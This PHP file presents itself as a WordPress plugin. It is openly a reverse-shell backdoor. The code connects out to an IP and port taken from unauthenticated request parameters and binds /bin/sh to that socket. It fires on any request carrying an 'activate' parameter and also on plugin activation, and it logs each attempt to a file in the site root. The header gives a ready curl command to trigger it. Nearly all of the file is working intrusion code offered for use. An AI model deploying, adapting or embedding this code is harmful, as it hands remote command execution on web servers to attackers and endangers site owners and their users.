<?php
/*
Plugin Name: WordPress Reverse Shell Remotely Activated
Description: Reverse Shell with Timestamp Logging - Activated via HTTP Request: curl 'http://[Your_WordPress_Site]/path/to/plugin_file.php?activate=1&ip=[Attacker_IP]&port=[Attacker_Port]'
Version: 0.1
Author: Sanjin Dedic
*/

function activate_reverse_shell() {
    // Capture IP and port from HTTP GET or POST request
    $ip = isset($_REQUEST['ip']) ? $_REQUEST['ip'] : '192.168.45.198'; // Default IP if not specified
    $port = isset($_REQUEST['port']) ? intval($_REQUEST['port']) : 443; // Default port if not specified

    // Path to the log file, located in the WordPress root directory
    $log_file = ABSPATH . 'log.txt'; 

    // Check if the log file exists, if not, create it and add a header
    if (!file_exists($log_file)) {
        file_put_contents($log_file, "Reverse Shell Connection Log\n\n", FILE_APPEND);
    }

    try {
        // Attempt to open a socket connection to the specified IP and port
        $sock = @fsockopen($ip, $port);

        // If the socket connection fails, throw an exception
        if (!$sock) {
            throw new Exception("Could not connect to $ip on port $port");
        }

        // Attempt to open a process (/bin/sh) with the socket as STDIN, STDOUT, STDERR
        $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

        // If the process creation fails, throw an exception
        if (!$proc) {
            throw new Exception("Failed to open a shell");
        }

        // Get the current timestamp
        $timestamp = date('Y-m-d H:i:s');
        // Message indicating a successful connection
        $success_message = "Reverse shell activated successfully. Probable connection at timestamp: $timestamp\n";
        // Append the success message to the log file
        file_put_contents($log_file, $success_message, FILE_APPEND);
        // Output the success message to STDOUT
        fwrite(STDOUT, $success_message);
    } catch (Exception $e) {
        // If an exception is caught, log the error message to the log file and output it to STDOUT
        file_put_contents($log_file, $e->getMessage() . "\n", FILE_APPEND);
        fwrite(STDOUT, "Error: " . $e->getMessage() . "\nCheck the root directory for the log file.\n");
    }
}

// Register the function to be executed via an HTTP request
if (isset($_REQUEST['activate'])) {
    activate_reverse_shell();
}

// Existing plugin activation hook (keep this if you still want the plugin to be activated in the traditional way)
register_activation_hook(__FILE__, 'activate_reverse_shell');
?>
